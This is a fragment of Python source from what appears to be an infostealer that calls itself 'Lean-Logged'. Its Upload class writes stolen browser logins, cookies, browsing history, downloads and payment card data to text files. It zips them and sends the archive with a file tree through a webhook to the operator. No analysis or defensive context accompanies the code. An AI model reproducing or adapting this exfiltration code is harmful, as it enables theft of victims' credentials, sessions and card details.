...
class Upload:
    ...
    def write_files(self):
        ...
        if __LOGINS__:
            with open("lean\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("lean\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("lean\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("lean\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("lean\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("lean.zip", "w") as zip:
            for file in os.listdir("lean"):
                zip.write(f"lean\\{file}", file)

    def l3ans3nd(self):
        self.webhook.send(
            embed=Embed(
                title="Lean-Logged",
                description="```" + '\n'.join(self.tree(Path("lean"))) + "```",
                color=0xffffff
            ),
            file=File("lean.zip"),
        )
